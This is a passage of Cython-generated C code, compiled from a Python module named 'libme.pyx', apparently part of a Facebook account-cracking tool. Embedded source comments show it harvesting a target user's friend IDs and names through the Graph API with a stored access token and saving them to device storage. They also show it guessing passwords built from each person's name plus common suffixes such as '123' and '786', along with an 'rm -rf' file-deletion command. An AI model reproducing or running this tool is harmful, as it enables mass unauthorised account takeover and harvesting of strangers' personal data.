          __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_4);
          __pyx_t_4 = 0;

          /* "libme.pyx":493
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])             # <<<<<<<<<<<<<<
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except KeyError:
 */
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 493, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__38); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 493, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 493, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_5 = PyNumber_Add(__pyx_t_8, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 493, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_14 = __Pyx_PyList_Append(__pyx_v_id, __pyx_t_5); if (unlikely(__pyx_t_14 == ((int)-1))) __PYX_ERR(0, 493, __pyx_L21_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "libme.pyx":494
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')             # <<<<<<<<<<<<<<
 * 			except KeyError:
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 494, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 494, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_15 = PyNumber_Add(__pyx_t_8, __pyx_kp_s__38); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 494, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 494, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_16 = PyNumber_Add(__pyx_t_15, __pyx_t_8); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 494, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = PyNumber_Add(__pyx_t_16, __pyx_kp_s__39); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 494, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_5 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_16, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_8);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 494, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "libme.pyx":492
 * 				file = open(____ , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 */
        }
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        /* "libme.pyx":487
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L28_try_end;
      __pyx_L21_error:;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":495
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except KeyError:             # <<<<<<<<<<<<<<
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()
 */
      __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError);
      if (__pyx_t_7) {
        __Pyx_AddTraceback("libme.James.__masal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 495, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_4);

        /* "libme.pyx":496
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except KeyError:
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(____, 'r').readlines()
 */
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__45, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 496, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        goto __pyx_L22_exception_handled;
      }
      goto __pyx_L23_except_error;
      __pyx_L23_except_error:;

      /* "libme.pyx":487
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L1_error;
      __pyx_L22_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      __pyx_L28_try_end:;
    }

    /* "libme.pyx":484
 * 		os.system("rm -rf /sdcard/f2.txt")
 * 		____ = ("/sdcard/f2.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  }
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":497
 * 			except KeyError:
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()             # <<<<<<<<<<<<<<
 * 		__id=open(____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 */
  if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 497, __pyx_L1_error) }
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_close); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 497, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 497, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":498
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()
 * 		__id=open(____, 'r').readlines()             # <<<<<<<<<<<<<<
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(____))
 */
  __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 498, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_v_____);
  __Pyx_GIVEREF(__pyx_v_____);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_____);
  __Pyx_INCREF(__pyx_n_s_r);
  __Pyx_GIVEREF(__pyx_n_s_r);
  PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_r);
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 498, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_readlines); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 498, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 498, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v___id = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":499
 * 		file.close()
 * 		__id=open(____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))             # <<<<<<<<<<<<<<
 * 		print("  [] Extra File saved in > %s"%(____))
 * 	def __Frr__(self):
 */
  __pyx_t_9 = PyObject_Length(__pyx_v___id); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 499, __pyx_L1_error)
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 499, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_92m_s_0_97m, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 499, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 499, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":500
 * 		__id=open(____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(____))             # <<<<<<<<<<<<<<
 * 	def __Frr__(self):
 * 		try:
 */
  __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Extra_File_saved_in_s, __pyx_v_____); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 500, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 500, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":473
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __masal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_AddTraceback("libme.James.__masal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v___total);
  __Pyx_XDECREF(__pyx_v_____);
  __Pyx_XDECREF(__pyx_v_zx);
  __Pyx_XDECREF(__pyx_v___ids);
  __Pyx_XDECREF(__pyx_v_rex);
  __Pyx_XDECREF(__pyx_v_ex);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v___id);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":501
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(____))
 * 	def __Frr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f2.txt'
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_33__Frr__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_33__Frr__ = {"__Frr__", (PyCFunction)__pyx_pw_5libme_5James_33__Frr__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_33__Frr__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Frr__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_32__Frr__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_32__Frr__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_myfile = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Frr__", 0);

  /* "libme.pyx":502
 * 		print("  [] Extra File saved in > %s"%(____))
 * 	def __Frr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f2.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":503
 * 	def __Frr__(self):
 * 		try:
 * 			myfile = '/storage/emulated/0/f2.txt'             # <<<<<<<<<<<<<<
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __Pyx_INCREF(__pyx_kp_s_storage_emulated_0_f2_txt);
      __pyx_v_myfile = __pyx_kp_s_storage_emulated_0_f2_txt;

      /* "libme.pyx":504
 * 		try:
 * 			myfile = '/storage/emulated/0/f2.txt'
 * 			for line in open(myfile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 504, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_myfile);
      __Pyx_GIVEREF(__pyx_v_myfile);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_myfile);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 504, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 504, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 504, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 504, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 504, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 504, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 504, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 504, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 504, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 504, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":505
 * 			myfile = '/storage/emulated/0/f2.txt'
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(myfile))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 505, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":504
 * 		try:
 * 			myfile = '/storage/emulated/0/f2.txt'
 * 			for line in open(myfile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":502
 * 		print("  [] Extra File saved in > %s"%(____))
 * 	def __Frr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f2.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":506
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(myfile))
 * 		ask = input("  [?] Password method [y/t] : ")
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__Frr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 506, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":507
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path %s not found"%(myfile))             # <<<<<<<<<<<<<<
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 */
      if (unlikely(!__pyx_v_myfile)) { __Pyx_RaiseUnboundLocalError("myfile"); __PYX_ERR(0, 507, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Your_Path_Wrong_Please_Check_Fi, __pyx_v_myfile); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 507, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 507, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
